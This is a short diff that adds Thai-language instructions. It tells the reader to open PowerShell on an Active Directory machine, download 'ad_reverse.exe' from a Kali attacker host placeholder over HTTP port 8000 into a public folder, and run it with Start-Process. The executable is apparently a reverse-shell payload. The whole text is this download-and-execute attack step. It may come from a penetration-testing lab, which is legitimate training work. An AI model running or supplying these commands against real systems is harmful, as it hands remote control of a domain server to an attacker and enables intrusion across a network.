@@ -1,0 +1,8 @@
+1. เปิด PowerShell บนเครื่อง AD แล้วพิมพ์
+
+Invoke-WebRequest -Uri http://<KALI_PUBLIC_IP>:8000/ad_reverse.exe -OutFile C:\Users\Public\ad_reverse.exe
+
+
+จากนั้น:
+
+Start-Process C:\Users\Public\ad_reverse.exe
